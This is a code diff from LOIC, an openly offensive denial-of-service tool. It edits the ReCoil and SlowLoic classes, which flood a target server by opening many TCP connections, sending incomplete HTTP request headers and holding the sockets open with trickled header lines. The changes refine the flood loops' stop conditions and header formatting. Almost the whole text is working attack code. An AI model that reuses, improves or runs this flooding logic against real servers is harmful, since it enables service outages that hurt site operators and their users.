@@ -159,7 +159,7 @@ namespace LOIC
 			this._random = random;
 			this._usegZip = usegZip;
 			this._resp = resp;
-			IsDelayed = true;
+			this.IsDelayed = true;
 			Requested = 0; // we reset this! - meaning of this counter changes in this context!
 		}
 		public override void Start()
@@ -193,11 +193,8 @@ namespace LOIC
 					State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
 					// forget about slow! .. we have enough saveguards in place!
-					while (IsDelayed && (DateTime.UtcNow < stop))
+					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
 					{
-						if(!this.IsFlooding || this.bw.CancellationPending) // XXX: HACKiSH
-							throw new Exception("U dun goofed"); // XXX: HACKiSH²
-
 						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 						socket.ReceiveTimeout = Timeout;
 						socket.ReceiveBufferSize = bsize;
@@ -239,7 +236,7 @@ namespace LOIC
 											header += System.Text.Encoding.ASCII.GetString(rbuf);
 										}
 										string[] sp = header.Split(new char[]{'\r','\n'}, StringSplitOptions.RemoveEmptyEntries);
-										for (int i = (sp.Length - 1); i >= 0; i--)
+										for (int i = (sp.Length - 1); this.IsFlooding && i >= 0; i--)
 										{
 											string[] tsp = sp[i].Split(new char[]{':'}, 2, StringSplitOptions.RemoveEmptyEntries);
 
@@ -291,7 +288,7 @@ namespace LOIC
 						}
 						if (_lSockets.Count >= _nSockets)
 						{
-							IsDelayed = false;
+							this.IsDelayed = false;
 						}
 						else if (Delay > 0)
 						{
@@ -300,7 +297,7 @@ namespace LOIC
 					}
 
 					State = ReqState.Downloading;
-					for (int i = (_lSockets.Count - 1); i >= 0; i--)
+					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
 					{ // keep the sockets alive
 						try
 						{
@@ -328,8 +325,8 @@ namespace LOIC
 					}
 
 					State = ReqState.Completed;
-					IsDelayed = (_lSockets.Count < _nSockets);
-					if (!IsDelayed)
+					this.IsDelayed = (_lSockets.Count < _nSockets);
+					if (!this.IsDelayed)
 					{
 						System.Threading.Thread.Sleep(Timeout);
 					}
@@ -353,7 +350,7 @@ namespace LOIC
 				}
 				_lSockets.Clear();
 				State = ReqState.Ready;
-				IsDelayed = true;
+				this.IsDelayed = true;
 			}
 		}
 	} // class ReCoil
@@ -410,7 +407,7 @@ namespace LOIC
 			this._randcmds = randcmds;
 			this._useget = useGet;
 			this._usegZip = usegZip;
-			IsDelayed = true;
+			this.IsDelayed = true;
 			Requested = 0; // we reset this! - meaning of this counter changes in this context!
 		}
 		public override void Start()
@@ -431,7 +428,7 @@ namespace LOIC
 			try
 			{
 				// header set-up
-				byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+				byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 				byte[] tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
 				DateTime stop = DateTime.UtcNow;
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
@@ -443,13 +440,10 @@ namespace LOIC
 					State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
 					// we have to do this really slow
-					while (IsDelayed && (DateTime.UtcNow < stop))
+					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
 					{
-						if(!this.IsFlooding || this.bw.CancellationPending) // XXX: HACKiSH
-							throw new Exception("U dun goofed"); // XXX: HACKiSH²
-
 						if (_random == true)
-							sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+							sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 
 						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 						try
@@ -467,8 +461,8 @@ namespace LOIC
 							_lSockets.Add(socket);
 							Requested++;
 						}
-						IsDelayed = (_lSockets.Count < _nSockets);
-						if (IsDelayed && (Delay > 0))
+						this.IsDelayed = (_lSockets.Count < _nSockets);
+						if (this.IsFlooding && this.IsDelayed && (Delay > 0))
 						{
 							System.Threading.Thread.Sleep(Delay);
 						}
@@ -478,7 +472,7 @@ namespace LOIC
 					{
 						tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", Functions.RandomString(), Environment.NewLine));
 					}
-					for (int i = (_lSockets.Count - 1); i >= 0; i--)
+					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
 					{ // keep the sockets alive
 						try
 						{
@@ -502,8 +496,8 @@ namespace LOIC
 					}
 
 					State = ReqState.Completed;
-					IsDelayed = (_lSockets.Count < _nSockets);
-					if (!IsDelayed)
+					this.IsDelayed = (_lSockets.Count < _nSockets);
+					if (!this.IsDelayed)
 					{
 						System.Threading.Thread.Sleep(Timeout);
 					}
@@ -527,7 +521,7 @@ namespace LOIC
 				}
 				_lSockets.Clear();
 				State = ReqState.Ready;
-				IsDelayed = true;
+				this.IsDelayed = true;
 			}
 		}
 	} // class SlowLoic
